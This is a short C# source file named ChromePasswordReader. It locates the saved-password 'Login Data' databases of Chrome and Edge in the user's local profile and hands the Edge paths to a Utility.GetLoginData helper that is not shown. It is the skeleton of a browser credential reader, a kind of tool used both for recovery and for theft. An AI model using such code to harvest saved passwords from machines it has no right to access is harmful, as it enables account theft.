using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace ChromePasswordReader
{
    static class Program
    {
        static void Main(string[] args)
        {
            string localApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            string googleChromeUserData = localApplicationData + @"\Google\Chrome\User Data";
            string edgeiumUserData = localApplicationData + @"\Microsoft\Edge\User Data";
            
            List<string> chromeLoginDataFiles = new List<string> {
                googleChromeUserData + @"\Default\Login Data",
                googleChromeUserData + @"\Login Data"
            };
            
            List<string> edgiumLoginDataFiles = new List<string> {
                edgeiumUserData + @"\Default\Login Data",
                edgeiumUserData + @"\Login Data"
            };

            Utility.GetLoginData(edgeiumUserData, edgiumLoginDataFiles);
        }
    }
}